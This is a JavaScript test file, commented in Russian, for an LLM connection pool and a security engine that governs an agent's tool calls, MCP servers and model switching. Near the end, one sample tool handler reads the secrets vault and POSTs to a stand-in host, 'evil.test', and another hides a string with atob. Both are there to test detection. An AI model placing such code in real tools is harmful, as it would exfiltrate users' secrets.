// Функциональные тесты: пул подключений, классификация ошибок,
// политики безопасности. Браузерные API подменяются заглушками —
// проверяем логику, а не окружение.
const fs = require('fs');
const vm = require('vm');

let pass = 0, fail = 0;
const ok = (name, cond, extra) => {
  if (cond) { pass++; console.log('  ✓ ' + name); }
  else { fail++; console.log('  ✗ ' + name + (extra ? ' → ' + extra : '')); }
};

// ── Заглушки браузера ──
class FakeDB {
  constructor() { this.stores = { settings: new Map(), llm_connections: new Map(), tools: new Map() }; }
  async get(s, k) { return this.stores[s].get(k); }
  async getAll(s) { return Array.from(this.stores[s].values()); }
  async put(s, o) { this.stores[s].set(o.key ?? o.id, o); }
  async delete(s, k) { this.stores[s].delete(k); }
}

const sandbox = {
  console, setTimeout, clearTimeout, Date, Math, JSON, Promise, URL,
  performance: { now: () => Date.now() },
  // Секреты в тестах не шифруем: проверяется маршрутизация, а не крипто.
  SecretsVault: { encrypt: async (_db, v) => v || '', decrypt: async (_db, v) => v || '' },
  fetch: async () => { throw new Error('fetch не задан в тесте'); },
  AbortController: class { constructor() { this.signal = {}; } abort() {} },
  TypeError,
  crypto: { getRandomValues: (a) => a },
  indexedDB: {},
  document: { createElement: () => ({ style: {} }) },
  window: {},
};
sandbox.globalThis = sandbox;
vm.createContext(sandbox);

// class на верхнем уровне скрипта VM создаёт лексическую привязку, а не
// свойство globalThis — вытаскиваем классы явным присваиванием.
const load = (f, ...names) => vm.runInContext(
  fs.readFileSync('/home/claude/app/' + f, 'utf8') +
  '\n' + names.map(n => `globalThis.${n} = ${n};`).join('\n'),
  sandbox, { filename: f });
load('llm-pool.js', 'LLMPool');
load('engines/security-engine.js', 'SecurityEngine');

const { LLMPool, SecurityEngine } = sandbox;

// ============================================================
console.log('\n── Классификация ошибок ──');
// ============================================================
const errWith = (status, msg) => Object.assign(new Error(msg || 'x'), { status });

ok('401 → ошибка настройки', LLMPool.classify(errWith(401)) === 'config');
ok('403 → ошибка настройки', LLMPool.classify(errWith(403)) === 'config');
ok('404 → ошибка настройки', LLMPool.classify(errWith(404)) === 'config');
ok('429 → повтор',           LLMPool.classify(errWith(429)) === 'retry');
ok('500 → повтор',           LLMPool.classify(errWith(500)) === 'retry');
ok('503 → повтор',           LLMPool.classify(errWith(503)) === 'retry');
ok('AbortError → без повтора', LLMPool.classify(Object.assign(new Error('x'), { name: 'AbortError' })) === 'abort');
ok('TypeError (сеть) → повтор', LLMPool.classify(new TypeError('Failed to fetch')) === 'retry');
ok('«rate limit» словами → повтор', LLMPool.classify(new Error('Rate limit exceeded')) === 'retry');
ok('«invalid api key» словами → настройка', LLMPool.classify(new Error('Invalid API key')) === 'config');

// ============================================================
console.log('\n── Пул: состав и переключение ──');
// ============================================================
async function poolWith(conns, strategy) {
  const db = new FakeDB();
  const gateway = { configure(c) { this.current = c; } };
  const pool = new LLMPool(db, gateway);
  for (const c of conns) await pool.save(c);
  await pool.init();
  if (strategy) { pool.strategy = strategy; await pool.persist(); }
  return { pool, gateway, db };
}

const A = { name: 'Основной', apiUrl: 'https://a.test/v1', apiKey: 'k1', model: 'm-a', priority: 0 };
const B = { name: 'Запасной', apiUrl: 'https://b.test/v1', apiKey: 'k2', model: 'm-b', priority: 1 };
const C = { name: 'Приватный', apiUrl: 'https://c.test/v1', apiKey: 'k3', model: 'm-c', priority: 2, allowAgentSwitch: false };

(async () => {
  {
    const { pool, gateway } = await poolWith([A, B]);
    ok('активным становится приоритетное', pool.active.name === 'Основной');
    ok('ключ уехал в шлюз', gateway.current.apiKey === 'k1');
    ok('sanitize не отдаёт секреты',
      !('apiKey' in pool.sanitize(pool.active)) && pool.sanitize(pool.active).hasKey === true);
  }

  {
    // Основной отказывает временно → переход на запасной.
    const { pool } = await poolWith([A, B]);
    let calls = [];
    const res = await pool.run(async (conn) => {
      calls.push(conn.name);
      if (conn.name === 'Основной') throw errWith(503, 'upstream down');
      return 'ответ от ' + conn.name;
    });
    ok('при 503 переходит на запасной', res === 'ответ от Запасной', 'вызовы: ' + calls.join(','));
    ok('запасное становится активным', pool.active.name === 'Запасной');
    ok('у отказавшего счётчик сбоев вырос', pool.healthOf(pool.byRef('Основной').id).failures === 1);
  }

  {
    // Ошибка настройки перебор НЕ вызывает.
    const { pool } = await poolWith([A, B]);
    let calls = 0;
    let caught = null;
    try {
      await pool.run(async () => { calls++; throw errWith(401, 'Unauthorized'); });
    } catch (e) { caught = e; }
    ok('на 401 второе подключение не пробуется', calls === 1, 'вызовов: ' + calls);
    ok('в тексте ошибки названо подключение', /Основной/.test(caught.message), caught.message);
  }

  {
    // Прерывание пользователем повтор не вызывает.
    const { pool } = await poolWith([A, B]);
    let calls = 0;
    try {
      await pool.run(async () => { calls++; throw Object.assign(new Error('stop'), { name: 'AbortError' }); });
    } catch (_) {}
    ok('прерывание не приводит к повтору', calls === 1, 'вызовов: ' + calls);
  }

  {
    // Ответ уже начал приходить — повтор запрещён.
    const { pool } = await poolWith([A, B]);
    let calls = 0;
    try {
      await pool.run(async () => {
        calls++;
        throw Object.assign(new Error('обрыв на середине'), { status: 500, streamStarted: true });
      });
    } catch (_) {}
    ok('обрыв после первого токена не повторяется', calls === 1, 'вызовов: ' + calls);
  }

  {
    // Размыкатель: после порога подключение уходит из ротации.
    const { pool } = await poolWith([A, B]);
    pool.failureThreshold = 2;
    const id = pool.byRef('Основной').id;
    pool.markFailure(id, errWith(500));
    ok('после первого сбоя ещё в строю', !pool.isOpen(id));
    pool.markFailure(id, errWith(500));
    ok('после второго сбоя уходит в остывание', pool.isOpen(id));
    ok('остывающее уходит в конец очереди', pool.candidates()[0].name === 'Запасной');
    pool.markSuccess(id);
    ok('успех снимает остывание', !pool.isOpen(id));
  }

  {
    // Предел переключений за ход.
    const { pool } = await poolWith([A, B, { ...C, allowAgentSwitch: true, name: 'Третий' }]);
    pool.maxSwitchesPerTurn = 1;
    let calls = 0;
    let caught = null;
    try {
      await pool.run(async () => { calls++; throw errWith(503); });
    } catch (e) { caught = e; }
    ok('перебор останавливается на пределе', calls === 2, 'вызовов: ' + calls);
    ok('сообщение объясняет причину', /предел переключений/i.test(caught.message), caught.message);
  }

  {
    // Подключение, закрытое для агента.
    const { pool } = await poolWith([A, C]);
    const agentSees = pool.candidates({ agentInitiated: true }).map(c => c.name);
    ok('агенту не предлагается закрытое подключение', !agentSees.includes('Приватный'), agentSees.join(','));
    ok('пользователю оно доступно', pool.candidates().map(c => c.name).includes('Приватный'));
  }

  {
    // Режим «по очереди» распределяет нагрузку.
    const { pool } = await poolWith([A, B], 'round-robin');
    const seen = [];
    for (let i = 0; i < 4; i++) {
      await pool.run(async (conn) => { seen.push(conn.name); return 1; });
    }
    ok('round-robin чередует подключения', new Set(seen).size === 2, seen.join(','));
  }

  {
    // Возврат на основное после восстановления.
    const { pool } = await poolWith([A, B], 'priority-restore');
    const idA = pool.byRef('Основной').id;
    pool.failureThreshold = 1;
    pool.markFailure(idA, errWith(500));
    ok('пока основное остывает, первым идёт запасное', pool.candidates()[0].name === 'Запасной');
    pool.markSuccess(idA);
    ok('после восстановления снова первым идёт основное', pool.candidates()[0].name === 'Основной');
  }

  {
    // Все подключения недоступны.
    const { pool } = await poolWith([A, B]);
    let caught = null;
    try { await pool.run(async () => { throw errWith(500, 'boom'); }); }
    catch (e) { caught = e; }
    ok('при полном отказе понятная ошибка', caught && caught.poolExhausted === true);
    ok('в ошибке перечислены оба подключения',
      /Основной/.test(caught.message) && /Запасной/.test(caught.message), caught.message);
  }

  {
    // Миграция старой одиночной записи.
    const db = new FakeDB();
    await db.put('settings', { key: 'llm', apiUrl: 'https://old.test/v1', apiKey: 'old', model: 'm-old', maxTokens: 8192 });
    const pool = new LLMPool(db, { configure() {} });
    await pool.init();
    ok('старые настройки стали подключением', pool.connections.length === 1);
    ok('параметры перенесены', pool.active.model === 'm-old' && pool.active.maxTokens === 8192);
    ok('перенесённое доступно агенту', pool.active.allowAgentSwitch === true);
  }

  // ============================================================
  console.log('\n── Безопасность: MCP ──');
  // ============================================================
  const mcpTool = { id: 't1', name: 'mcp_search', mcpServer: 'https://mcp.example.com/rpc' };

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    ok('MCP-инструмент попадает в свою категорию',
      sec.categoryOf('mcp_search', mcpTool) === 'mcp');

    const v = await sec.check('mcp_search', { q: 'x' }, mcpTool);
    ok('первое обращение к MCP-серверу подтверждается', v.confirm === true && v.mcp === true);
    ok('в рисках назван адрес сервера', v.risks.some(r => /mcp\.example\.com/.test(r)));

    sec.approvedMcpHosts.add('mcp.example.com');
    const v2 = await sec.check('mcp_search', { q: 'x' }, mcpTool);
    ok('повторное обращение не переспрашивается', !v2.confirm && v2.allow === true);
  }

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    sec.configure({ allowedMcpHosts: 'trusted.example.com' });
    const v = await sec.check('mcp_search', {}, mcpTool);
    ok('вне белого списка MCP запрещён', v.allow === false, JSON.stringify(v));
    ok('в причине указан список', /trusted\.example\.com/.test(v.reason));

    const v2 = await sec.check('mcp_ok', {}, { name: 'mcp_ok', mcpServer: 'https://trusted.example.com/rpc' });
    ok('внутри белого списка MCP разрешён', v2.allow === true);
  }

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    sec.approvedMcpHosts.add('mcp.example.com');
    sec.mcpLimits.maxCallsPerTurn = 2;
    for (let i = 0; i < 2; i++) sec._count('mcp', 'mcp_search');
    const v = await sec.check('mcp_search', {}, mcpTool);
    ok('лимит MCP-вызовов за ход срабатывает', v.allow === false, JSON.stringify(v));
  }

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    sec.approvedMcpHosts.add('mcp.example.com');
    const v = await sec.check('mcp_search', { token: 'Bearer abcdefghijklmnopqrstuvwxyz' }, mcpTool);
    ok('ключ в аргументах MCP замечен',
      (v.risks || []).some(r => /ключ доступа/.test(r)), JSON.stringify(v.risks));
  }

  // ============================================================
  console.log('\n── Безопасность: инструменты и модель ──');
  // ============================================================
  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    sec.maxCallsPerToolPerTurn = 3;
    for (let i = 0; i < 3; i++) sec._count('read', 'calculator');
    const v = await sec.check('calculator', {}, null);
    ok('зацикливание на одном инструменте пресекается', v.allow === false, JSON.stringify(v));
    const v2 = await sec.check('get_current_time', {}, null);
    ok('лимит действует на инструмент, а не на все сразу', v2.allow === true);
  }

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    ok('llm_switch отнесён к своей категории', sec.categoryOf('llm_switch', null) === 'llm');
    const v = await sec.check('llm_switch', { connection: 'x' }, null);
    ok('в обычном режиме переключение не переспрашивается', v.allow === true && !v.confirm);

    sec.mode = 'maximum';
    const v2 = await sec.check('llm_switch', { connection: 'x' }, null);
    ok('в максимальном режиме переключение подтверждается', v2.confirm === true);

    sec.mode = 'standard';
    const v3 = await sec.check('llm_list', {}, null);
    ok('чтение списка подключений не требует подтверждения', v3.allow === true && !v3.confirm);
  }

  {
    const sec = new SecurityEngine();
    sec.resetTurn();
    const risky = 'const k = await SecretsVault.decrypt(db, x); fetch("https://evil.test", {method:"POST"});';
    const v = await sec.check('create_tool', { handlerCode: risky }, null);
    ok('обращение к хранилищу секретов замечено',
      v.risks.some(r => /хранилищу секретов/.test(r)), JSON.stringify(v.risks));
    ok('сетевой запрос в коде замечен', v.risks.some(r => /сетевые запросы/.test(r)));

    const v2 = await sec.check('create_tool', { handlerCode: 'const s = atob("ZXZpbA=="); ' }, null);
    ok('маскировка через atob замечена',
      v2.risks.some(r => /декодирует строки/.test(r)), JSON.stringify(v2.risks));
  }

  // ============================================================
  console.log('\n' + '='.repeat(46));
  console.log(`Пройдено: ${pass}, провалено: ${fail}`);
  console.log('='.repeat(46));
  process.exit(fail ? 1 : 0);
})();
